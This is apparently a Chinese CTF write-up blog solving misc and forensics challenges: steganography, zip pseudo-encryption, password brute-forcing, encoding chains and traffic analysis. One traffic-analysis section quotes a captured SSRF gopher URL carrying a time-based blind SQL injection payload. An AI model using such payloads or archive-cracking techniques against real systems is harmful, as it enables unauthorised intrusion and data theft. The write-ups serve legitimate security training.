<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">bytes</span>([<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">__import__</span>(<span class="string">&#x27;re&#x27;</span>).findall(<span class="string">r&#x27;1[0-2][0-9]|[4-9][0-9]&#x27;</span>, <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">str</span>(<span class="built_in">int</span>((<span class="built_in">int</span>(<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).path.getmtime(filename) * (<span class="number">10</span> ** <span class="number">9</span>)) % (<span class="number">2</span> ** <span class="number">64</span> - <span class="number">1</span>)) / (<span class="number">10</span> ** <span class="number">9</span>))) <span class="keyword">for</span> filename <span class="keyword">in</span> <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).listdir(<span class="string">&#x27;./&#x27;</span>)]))]).decode()</span><br></pre></td></tr></table></figure>

<p><code>flag&#123;T1m3_f1ie5&#125;</code></p>
<h2 id="看雪看雪看雪-x2F-江苏工匠杯-1"><a href="#看雪看雪看雪-x2F-江苏工匠杯-1" class="headerlink" title="看雪看雪看雪&#x2F;江苏工匠杯(1)"></a>看雪看雪看雪&#x2F;江苏工匠杯(1)</h2><p>这里用到了NTFS流来隐藏文件，将压缩包用<code>winrar</code>解压后</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">NTFS文件系统中存在NTFS数据流文件也被称为 Alternate data streams（ADS）， 是NTFS磁盘格式的一个特性之一</span><br><span class="line">每个文件都有主文件流和非主文件流，主文件流能够直接看到；而非主文件流寄宿于主文件流中，无法直接读取，这个非主文件流就是NTFS交换数据流。</span><br><span class="line">也就是说非主文件流是真实存在于我们系统的，但是我们看不到，可以通过创建这样的数据交换流文件，达到隐写的效果。</span><br></pre></td></tr></table></figure>

<p>用<a target="_blank" rel="noopener" href="https://bbs.kafan.cn/thread-460084-1-1.html">NtfsStreamsEditor2</a>工具进行扫描，就可以看到隐藏的文件，导出后</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.ord:同淋雪</span><br><span class="line">2.pa:他朝</span><br><span class="line">3.ssw:若是</span><br><span class="line">flag:</span><br></pre></td></tr></table></figure>

<p><img data-src="/../images/WRITEUP/image-20221206145928817.png" alt="image-20221206145928817"></p>
<p>这里用到了<a target="_blank" rel="noopener" href="https://www.darkside.com.au/snow/">snow隐写</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-C：如果隐藏，则压缩数据，或者如果提取，则会解压缩。</span><br><span class="line">-Q：静音模式。如果未设置，则程序报告统计信息，例如压缩百分比和可用存储空间的数量。</span><br><span class="line">-S：报告文本文件中隐藏消息的近似空间量。考虑线长度，但忽略其他选项。</span><br><span class="line">-p password：如果设置为此，则在隐藏期间将使用此密码加密数据，或在提取期间解密。</span><br><span class="line">-l line-length：在附加空格时，Snow将始终产生比此值短的线条。默认情况下，它设置为80。</span><br><span class="line">-f message-file：此文件的内容将隐藏在输入文本文件中。</span><br><span class="line">-m message-string：此字符串的内容将被隐藏在输入文本文件中。请注意，除非在字符串中包含一个换行符，否则在提取邮件时，否则不会打印换行符。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">snow.exe -C -p &quot;他朝若是同淋雪&quot; outfile</span><br></pre></td></tr></table></figure>

<p>就能得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">此生也算共白头flag&#123;Sn0w_M@n!!!!!!!&#125;</span><br></pre></td></tr></table></figure>

<h2 id="流量分析2-x2F-CTF-1"><a href="#流量分析2-x2F-CTF-1" class="headerlink" title="流量分析2&#x2F;CTF(1)"></a>流量分析2&#x2F;CTF(1)</h2><p>导入流量包，分析筛选</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http &amp;&amp; ip.src==39.105.136.196</span><br></pre></td></tr></table></figure>

<p>发现每个包都传了一些字符，拼起来</p>
<p><img data-src="/../images/WRITEUP/image-20221206153005354.png" alt="image-20221206153005354"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fl&#123;17uaji1l&#125;</span><br></pre></td></tr></table></figure>

<p>或者导出http，也能得到相同的结果</p>
<p><img data-src="/../images/WRITEUP/image-20221206153207472.png" alt="image-20221206153207472"></p>
<p>flag就是</p>
<p><code>flag&#123;17uaji1l&#125;</code></p>
<h2 id="nice-bgm-x2F-CTF-1"><a href="#nice-bgm-x2F-CTF-1" class="headerlink" title="nice_bgm&#x2F;CTF(1)"></a>nice_bgm&#x2F;CTF(1)</h2><p>压缩包里还要一个<code>.DS_Store</code>文件，以为是代码泄露，原来没啥用</p>
<p>音乐文件的备注里有以下信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">163 key(Don&#x27;t modify):L64FU3W4YxX3ZFTmbZ+8/ZZ9Y/tgOmNcoJ5dtFf1KVqxwH/xPBSYX/RBw/iqmLiJzzxwYmFqoKqDihfI1Oc2/J/epKAHJUDYbGiTmY5mE6o/liOSritI10J0pq+CjaamnQOVUqOOwqsbN8Wc0EzN1an5Qsju02G8NLehmTgmOQzq8NG+XfMYT438I1nk1m9dTous+vB2MuGROm4ncI5O14DuzsjhinroVxILf0ryZWPcn6odYY/Ixcfw/iyIXHKgAFisF+xpACuZlDSqBUECNeGFvO58cSLJgwoCwfe9aGEgjCNlm0tTq8F0bsiUON9ZNlbmnNgqznuWizs02TXarMxROmeS1ZKlh7BxYBOjIJFw7HyQG2xtGDIgpbnmrbRaZfwmZ979WQTqJRbAdpZzXR9VLbAhpvKKIo1mC4wdOgX3XN5yjbXRVLJjoeR1z3o7VaijzqYt7DdxGuZyDfv1Jn3URw9DKSbL0bP7LK9mH7UyQPNzQeyCVEvdutWWTsSqH7SMT5c5RERCPzSnCUBd8V/aCmcrwSo1zG4DYGu4x8m2Xe5UVrjqgjFRELn9RPjNPPntCAOZw2YaRl3mvbOXlg==</span><br></pre></td></tr></table></figure>

<p>并不能用base64解码</p>
<p>题目提示了：我拿出自己的<strong>私密音乐</strong>来和你分享，一起享受快乐吧</p>
<p>所以这其实是<code>MP3 private_bit隐写</code></p>
<p>在<code>010Editor</code>打开文件并安装插件后，可以发现在<code>MPEG_FRAME mf[]</code>存在<code>private_bit</code></p>
<p><img data-src="/../images/WRITEUP/image-20221207094527522.png" alt="image-20221207094527522"></p>
<p>起始字节是399D0h，即235984</p>
<p>总共有12+1+2+1+4+2+1+1+2+2+1+1+2&#x3D;32，即4字节，<code>private_bit</code>在24，第三字节</p>
<p>所以要从前一个字节开始提取内容，对应的地址是235986</p>
<p>数字长度是1A1h或1A2h，需要筛选一下</p>
<p><img data-src="/../images/WRITEUP/image-20221207094942122.png" alt="image-20221207094942122"></p>
<p>坑爹的是它到了某一位之后<code>private_bit</code>就是0了，找个尽量靠后的位置，例如mf[500]，6CA22h&#x3D;444962</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1A1h:[0, 1, 26, 50, 75, 99, 124, 148, 173, 197, 222, 246, 271, 295, 320, 344, 369, 393, 418, 442, 467, 491]</span><br></pre></td></tr></table></figure>

<p>读取每个<code>private_bit</code>所在字节的最后一位，然后每8位成ascii码转字符</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">n=235986	#第一个private bit起始位置</span><br><span class="line">file = open(&#x27;1.mp3&#x27;,&#x27;rb&#x27;)        #rb是读取二进制文件</span><br><span class="line">while n &lt; 444962 :      #已经可以结束的位置，可以发现后面private_bit的值都为0</span><br><span class="line">    file.seek(n,0)              #文件游标移动到n</span><br><span class="line">    if number in list:</span><br><span class="line">        n += 417</span><br><span class="line">    else:</span><br><span class="line">        n += 418</span><br><span class="line">    file_read_result = file.read(1)      #读取一个字节</span><br><span class="line">    read_content = bin(ord(file_read_result))[-1]   #ord返回对应数字 bin用二进制表示  最后一位返回的是值</span><br><span class="line">    result = result + read_content</span><br><span class="line">    number += 1</span><br><span class="line">    </span><br><span class="line">for n,i in enumerate(result):</span><br><span class="line">    s=&quot;&quot;</span><br><span class="line">    s+=i</span><br><span class="line">    if (n+1)%8==0:</span><br><span class="line">        print(chr(int(s,2)),end=&quot;&quot;)</span><br><span class="line">        s=&quot;&quot;</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<p><code>flag&#123;0k4_YOu_Seem_s0_cl3ver_t0_find_f1ag!&#125;</code></p>
<h2 id="fakezip-x2F-宜兴网信办-1"><a href="#fakezip-x2F-宜兴网信办-1" class="headerlink" title="fakezip&#x2F;宜兴网信办(1)"></a>fakezip&#x2F;宜兴网信办(1)</h2><p>压缩包直接解压需要密码</p>
<p>题名提示了是<code>fakezip</code>，可能是伪加密的压缩包</p>
<p><img data-src="/../images/WRITEUP/image-20221207112415879.png" alt="image-20221207112415879"></p>
<p><img data-src="/../images/WRITEUP/image-20221207112733670.png" alt="image-20221207112733670"></p>
<p>把<code>50 4B 03 04</code>和<code>50 4B 01 02</code>后面的<code>01 00</code>改成<code>00 00</code>后，再解压就不需要密码了</p>
<p>或者用<a target="_blank" rel="noopener" href="https://zhangfa.lanzoub.com/imhZ206wft0d">ZipCenOp.jar</a>跑一下，也能直接解压</p>
<p>flag在压缩包的图片中</p>
<p><code>flag&#123;39281de6-fe64-11ea-adc1-0242ac120002&#125;</code></p>
<h2 id="Check-x2F-CTF-1"><a href="#Check-x2F-CTF-1" class="headerlink" title="Check&#x2F;CTF(1)"></a>Check&#x2F;CTF(1)</h2><p>本题目使用LSB隐写方式将flag的HTML编码形式嵌入了PNG图片中。 </p>
<p>可以使用<code>StegSolve</code>提取出RGB三个通道的最低位信息</p>
<p><img data-src="/../images/WRITEUP/image-20221207150830883.png" alt="image-20221207150830883"></p>
<p>而顶部是一串HTML编码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#x66;&amp;#x6c;&amp;#x61;&amp;#x67;&amp;#x7b;&amp;#x68;&amp;#x30;&amp;#x77;&amp;#x5f;&amp;#x34;&amp;#x62;&amp;#x6f;&amp;#x75;&amp;#x54;&amp;#x5f;&amp;#x65;&amp;#x6e;&amp;#x63;&amp;#x30;&amp;#x64;&amp;#x65;&amp;#x5f;&amp;#x34;&amp;#x6e;&amp;#x64;&amp;#x5f;&amp;#x70;&amp;#x6e;&amp;#x47;&amp;#x7d;</span><br></pre></td></tr></table></figure>

<p>将该编码通过HTML解码后，得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import html</span><br><span class="line">print(html.unescape(str))</span><br></pre></td></tr></table></figure>

<p><code>flag&#123;h0w_4bouT_enc0de_4nd_pnG&#125;</code></p>
<h2 id="Wire1-x2F-CTF-1"><a href="#Wire1-x2F-CTF-1" class="headerlink" title="Wire1&#x2F;CTF(1)"></a>Wire1&#x2F;CTF(1)</h2><p>分析以下这个包，大概意思是某个人在盲注获得flag的值</p>
<p><img data-src="/../images/WRITEUP/image-20221207153502271.png" alt="image-20221207153502271"></p>
<p>每个字符判断，当恰好正确的时候，下一个HTTP包的长度就会变成978，且这个人会继续测试下一个字符</p>
<p>最后得到所有字符的十进制是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">102 108 97 103 123 119 49 114 101 115 104 65 82 75 95 101 122 95 49 115 110 116 105 116 125</span><br></pre></td></tr></table></figure>

<p>转ascii得到flag</p>
<p><code>flag&#123;w1reshARK_ez_1sntit&#125;</code></p>
<h2 id="Encode-x2F-CTF-1"><a href="#Encode-x2F-CTF-1" class="headerlink" title="Encode&#x2F;CTF(1)"></a>Encode&#x2F;CTF(1)</h2><p>这一题有点抽象</p>
<p>密文是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4O595954494Q32515046324757595N534R52415653334357474R4N575955544R4O5N4Q46434S4O59474253464Q5N444R4Q51334557524O5N4S424944473542554O595N44534O324R49565746515532464O49345649564O464R4R494543504N35</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://www.jisuan.mobi/puzzm6z1B1HH6yXW.html">rot13解密</a>（这种里面数字加上OQRN的是Rot13加密）</p>
<p>这里不要用<a target="_blank" rel="noopener" href="http://www.hiencode.com/rot13.html">hiencode的rot13</a>，因为它会自动转小写，然后后面的base16就无法解码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4B595954494D32515046324757595A534E52415653334357474E4A575955544E4B5A4D46434F4B59474253464D5A444E4D51334557524B5A4F424944473542554B595A44534B324E49565746515532464B49345649564B464E4E494543504A35</span><br></pre></td></tr></table></figure>

<p>然后<a target="_blank" rel="noopener" href="http://www.hiencode.com/base64.html">base16&#x2F;HEX解密</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">KYYTIM2QPF2GWYZSNRAVS3CWGNJWYUTNKZMFCOKYGBSFMZDNMQ3EWRKZOBIDG5BUKYZDSK2NIVWFQU2FKI4VIVKFNNIECPJ5</span><br></pre></td></tr></table></figure>

<p>然后base32解密</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">V143Pytkc2lAYlV3SlRmVXQ9X0dVdmd6KEYpP3t4V29+MElXSER9TUEkPA==</span><br></pre></td></tr></table></figure>

<p>然后base64解密</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">W^7?+dsi@bUwJTfUt=_GUvgz(F)?&#123;xWo~0IWHD&#125;MA$&lt;</span><br></pre></td></tr></table></figure>

<p>然后base85解密，这里所有在线的都不行</p>
<p>可以用CyberChef，<code>ROT13-HEX-Base32-Base64-Base85/IPv6</code></p>
<p><img data-src="/../images/WRITEUP/image-20221207163257353.png" alt="image-20221207163257353"></p>
<p>得到flag</p>
<p><code>flag&#123;W0w_y0u_c4n_rea11y_enc0d1ng!&#125;</code></p>
<h2 id="1-misc-x2F-青岛华能-1"><a href="#1-misc-x2F-青岛华能-1" class="headerlink" title="1-misc&#x2F;青岛华能(1)"></a>1-misc&#x2F;青岛华能(1)</h2><p>附件是一个加密的压缩包</p>
<p>提示是<code>偷偷告诉你，密码是出题人生日</code></p>
<p>那就爆破咯</p>
<p>用ARCHPR爆破，最开始以为只有月日，没想到还有年</p>
<p><img data-src="/../images/WRITEUP/image-20221207164438429.png" alt="image-20221207164438429"></p>
<p>得到口令20001228，解压后又是一个加密的压缩包和一张图片(flag不在这)</p>
<p>说明这张图片肯定有问题</p>
<p>这张图片和压缩包内的CRC(循环冗余检验)的值是一样的，可以使用ARCHPR的明文攻击</p>
<p><img data-src="/../images/WRITEUP/image-20221207170256882.png" alt="image-20221207170256882"></p>
<p>将图片压缩后导入<code>明文文件路径</code>然后开始攻击</p>
<p>这里可能会<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_51999772/article/details/122754570">报错</a></p>
<p><img data-src="/../images/WRITEUP/image-20221207165633432.png" alt="image-20221207165633432"></p>
<p>原因多半是已知文件再进行的压缩方式与待解密文件的压缩方式不同，使用<code>winRAR</code>可以进行调整<code>压缩方式</code>，也就是说需要用winrar压缩而不能用windows自带的压缩</p>
<p>等待亿会儿后就能获得结果了，得到解压后的文件</p>
<p>里面还有一个加密的压缩包，里面就是flag，提示是<code>没有密码，真的没有密码！！</code></p>
<p>可能是伪加密，用<code>ZipCenOp</code>跑一下，得到flag</p>
<p><code>flag&#123;159c6275f0015c037e70a118f25b9a99&#125;</code></p>
<h2 id="碎纸机11-x2F-CTF-1"><a href="#碎纸机11-x2F-CTF-1" class="headerlink" title="碎纸机11&#x2F;CTF(1)"></a>碎纸机11&#x2F;CTF(1)</h2><p>附件压缩包解压后有50张图片，根据题目描述<code>我们从碎纸机里抢救回来了某个关键图片资料，你能帮我们修复它吗？</code>，需要将50张图片拼起来。</p>
<p>在<a target="_blank" rel="noopener" href="https://uutool.cn/photo-collage/">拼图网站</a>，设置参数后</p>
<p><img data-src="/../images/WRITEUP/image-20221207172631458.png" alt="image-20221207172631458"></p>
<p>按时间升序顺序导入图片</p>
<p><img data-src="/../images/WRITEUP/png-16704640719841.png" alt="png"></p>
<p><a target="_blank" rel="noopener" href="https://cli.im/deqr">解码</a>就能得到<code>flag</code></p>
<p><code>flag&#123;You Can Repair A Picture From Splices Baesd On Entropy&#125;</code></p>
<h2 id="Let-god-knows-x2F-CTF-1"><a href="#Let-god-knows-x2F-CTF-1" class="headerlink" title="Let_god_knows&#x2F;CTF(1)"></a>Let_god_knows&#x2F;CTF(1)</h2><p><code>stegsolve</code>打开图片，没有隐写</p>
<p>看了大佬的WP，Red plane 0下有一个二维码？？</p>
<p><img data-src="/../images/WRITEUP/image-20221208101254850.png" alt="image-20221208101254850"></p>
<p>解码得到flag</p>
<p><code>flag&#123;Ok@y!G0d_know5_n0w&#125;</code></p>
<h2 id="misc2-1-x2F-CTF-1"><a href="#misc2-1-x2F-CTF-1" class="headerlink" title="misc2-1&#x2F;CTF(1)"></a>misc2-1&#x2F;CTF(1)</h2><p>附件里是一张图片，但是打不开，不支持这种格式</p>
<p>大佬的WP说根据这里可以看出来图片是逆序的？？</p>
<p><img data-src="/../images/WRITEUP/image-20221208103141105.png" alt="image-20221208103141105"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ebo tohP ohso SC p</span><br><span class="line">obe Phot osho p CS=&gt; obe Photoshop CS</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">f1=open(&quot;task_flag.jpg&quot;,&quot;rb&quot;).read()</span><br><span class="line">f1_len=len(f1)</span><br><span class="line">f2=open(&quot;1.jpg&quot;,&quot;ab&quot;)</span><br><span class="line">i=0</span><br><span class="line">while i&lt;f1_len:</span><br><span class="line">    f2.write(f1[i:i+4][::-1])</span><br><span class="line">    i=i+4</span><br><span class="line">f2.close()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">b = a[i:j]   表示复制a[i]到a[j-1]，以生成新的list对象</span><br><span class="line">b = a[i:j:s]表示：i,j与上面的一样，但s表示步进，缺省为1.</span><br><span class="line">所以a[i:j:1]相当于a[i:j]</span><br><span class="line">当s&lt;0时，i缺省时，默认为-1. j缺省时，默认为-len(a)-1</span><br><span class="line">所以a[::-1]相当于 a[-1:-len(a)-1:-1]，也就是从最后一个元素到第一个元素复制一遍，即倒序。</span><br></pre></td></tr></table></figure>

<p>flag在<code>1.jpg</code>中</p>
<p><code>flag&#123;F098996689560BBB1B566EBC10D5E564&#125;</code></p>
<h2 id="pcap1-x2F-CTF-1"><a href="#pcap1-x2F-CTF-1" class="headerlink" title="pcap1&#x2F;CTF(1)"></a>pcap1&#x2F;CTF(1)</h2><p>导出HTTP对象，发现一个没有URL的，包序号是60</p>
<p><img data-src="/../images/WRITEUP/image-20221208162549943.png" alt="image-20221208162549943"></p>
<p>筛选<code>tcp contains &quot;flag&quot;</code>，追踪TCP流</p>
<p><img data-src="/../images/WRITEUP/image-20221208112331349.png" alt="image-20221208112331349"></p>
<p>将下面的密文字符串<code>rot13-base64-carsar</code>后就能得到明文</p>
<p>值得注意的是，解密的时候需要根据密文的第一个数字来判断使用何种方式解密</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">def decode(pt, cnt=61):</span><br><span class="line">    for i in range(cnt):</span><br><span class="line">        c = pt[0]</span><br><span class="line">        if c == &#x27;1&#x27;:</span><br><span class="line">            pt = rot13(pt[1:])</span><br><span class="line">        if c == &#x27;2&#x27;:</span><br><span class="line">            pt = b64d(pt[1:]).decode()</span><br><span class="line">        if c == &#x27;3&#x27;:</span><br><span class="line">            pt = caesar(pt[1:],-3)</span><br><span class="line">    print(pt)</span><br></pre></td></tr></table></figure>

<p><code>flag&#123;li0ns_and_tig3rs_4nd_b34rs_0h_mi&#125;</code></p>
<h2 id="running-x2F-CTF-1"><a href="#running-x2F-CTF-1" class="headerlink" title="running&#x2F;CTF(1)"></a>running&#x2F;CTF(1)</h2><p>查看属性，是自解压格式</p>
<p><img data-src="/../images/WRITEUP/image-20221212103944397.png" alt="image-20221212103944397"></p>
<p>解压后得到</p>
<p><img data-src="/../images/WRITEUP/image-20221212104020609.png" alt="image-20221212104020609"></p>
<p>文档里面是<code>error</code>，执行可执行文件，得到<code>tif</code>文件，用ps打开</p>
<p>把矩形隐藏，得到一串代码</p>
<p><img data-src="/../images/WRITEUP/image-20221212102237892.png" alt="image-20221212102237892"></p>
<p>010Editor打开，在文件末尾可以看到</p>
<p><img data-src="/../images/WRITEUP/image-20221212104411976.png" alt="image-20221212104411976"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run-&gt;njCp1HJBPLVTxcMhUHDPwE7mPW</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">s=&quot;njCp1HJBPLVTxcMhUHDPwE7mPW&quot;</span><br><span class="line">for num,i in enumerate(s):</span><br><span class="line">    if (num+1)%2==0:</span><br><span class="line">        print(chr(ord(i)+1),end=&quot;&quot;)</span><br><span class="line">    else:</span><br><span class="line">        print(chr(ord(i)-1),end=&quot;&quot;)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkBq0IICOMUUwdLiTICQvF6nOX</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<p><code>flag&#123;mkBq0IICOMUUwdLiTICQvF6nOX&#125;</code></p>
<h2 id="流量分析1-x2F-GA-1"><a href="#流量分析1-x2F-GA-1" class="headerlink" title="流量分析1&#x2F;GA(1)"></a>流量分析1&#x2F;GA(1)</h2><p>http包</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">http://39.105.136.196:30025/index.php?url=gopher://127.0.0.1:80/_POST%20%2Fadmin.php%20HTTP%2F1.1%250d%250aHost%3A%20localhost%3A80%250d%250aConnection%3A%20close%250d%250aContent-Type%3A%20application%2Fx-www-form-urlencoded%250d%250aContent-Length%3A%2078%250d%250a%250d%250aid%253D1%2529%2520and%2520if%2528%2528ascii%2528substr%2528%2528select%2520flag%2520from%2520flag%2529%252C1%252C1%2529%2529%253D%252740%2527%2529%252Csleep%25283%2529%252C0%2529%2520--%2520</span><br><span class="line">URL解码后：</span><br><span class="line">http://39.105.136.196:30025/index.php?url=gopher://127.0.0.1:80/_POST /admin.php HTTP/1.1</span><br><span class="line">Host: localhost:80</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 78</span><br><span class="line"></span><br><span class="line">id=1) and if((ascii(substr((select flag from flag),1,1))=&#x27;40&#x27;),sleep(3),0) -- </span><br></pre></td></tr></table></figure>

<p><code>sql注入</code>，只需要将所有正确的字符拼起来就行</p>
<p>用<code>http.time &gt;= 3</code>进行筛选</p>
<p>可以在导出HTTP的选项中筛选</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag%2529%252C 1 %252C1%2529%2529%253D%2527(去空格)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">102 108 97 103 123 49 113 119 121 50 55 56 49 125</span><br></pre></td></tr></table></figure>

<p>转<code>ascii</code>得到flag</p>
<p><code>flag&#123;1qwy2781&#125;</code></p>
<h2 id="津门杯2021-m1-x2F-津门杯-1"><a href="#津门杯2021-m1-x2F-津门杯-1" class="headerlink" title="津门杯2021-m1&#x2F;津门杯(1)"></a>津门杯2021-m1&#x2F;津门杯(1)</h2><p><code>stegsolve</code>打开图片后提取文件信息，可以看到有base64密文</p>
<p><img data-src="/../images/WRITEUP/image-20221212105936357.png" alt="image-20221212105936357"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZmxhZ3tsNURHcUYxcFB6T2IyTFU5MTlMTWFCWVM1QjFHMDFGRH0=</span><br></pre></td></tr></table></figure>

<p>解密得到flag</p>
<p><code>flag&#123;l5DGqF1pPzOb2LU919LMaBYS5B1G01FD&#125;</code></p>
<h2 id="m0-01-x2F-太湖杯-1"><a href="#m0-01-x2F-太湖杯-1" class="headerlink" title="m0_01&#x2F;太湖杯(1)"></a>m0_01&#x2F;太湖杯(1)</h2><p>这是USB	</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4字节为鼠标流量，8字节为键盘流量。</span><br></pre></td></tr></table></figure>

<p><img data-src="/../images/WRITEUP/image-20221212111032214.png" alt="image-20221212111032214"></p>
<p>导出该列后将第5、6位转16进制后根据转换成对应的键盘字符</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mappings = &#123; 0x04:&quot;A&quot;,  0x05:&quot;B&quot;,  0x06:&quot;C&quot;, 0x07:&quot;D&quot;, 0x08:&quot;E&quot;, 0x09:&quot;F&quot;, 0x0A:&quot;G&quot;,  0x0B:&quot;H&quot;, 0x0C:&quot;I&quot;,  0x0D:&quot;J&quot;, 0x0E:&quot;K&quot;, 0x0F:&quot;L&quot;, 0x10:&quot;M&quot;, 0x11:&quot;N&quot;,0x12:&quot;O&quot;,  0x13:&quot;P&quot;, 0x14:&quot;Q&quot;, 0x15:&quot;R&quot;, 0x16:&quot;S&quot;, 0x17:&quot;T&quot;, 0x18:&quot;U&quot;,0x19:&quot;V&quot;, 0x1A:&quot;W&quot;, 0x1B:&quot;X&quot;, 0x1C:&quot;Y&quot;, 0x1D:&quot;Z&quot;, 0x1E:&quot;1&quot;, 0x1F:&quot;2&quot;, 0x20:&quot;3&quot;, 0x21:&quot;4&quot;, 0x22:&quot;5&quot;,  0x23:&quot;6&quot;, 0x24:&quot;7&quot;, 0x25:&quot;8&quot;, 0x26:&quot;9&quot;, 0x27:&quot;0&quot;, 0x28:&quot;n&quot;, 0x2a:&quot;[DEL]&quot;,  0X2B:&quot;    &quot;, 0x2C:&quot; &quot;,  0x2D:&quot;-&quot;, 0x2E:&quot;=&quot;, 0x2F:&quot;[&quot;,  0x30:&quot;]&quot;,  0x31:&quot;\\&quot;, 0x32:&quot;~&quot;, 0x33:&quot;;&quot;,  0x34:&quot;&#x27;&quot;, 0x36:&quot;,&quot;,  0x37:&quot;.&quot; &#125;</span><br></pre></td></tr></table></figure>

<p>得到一串密文</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">884080810882108108821042084010421</span><br></pre></td></tr></table></figure>

<p>只有01248，为云影加密，解密</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">THISISFLAG</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
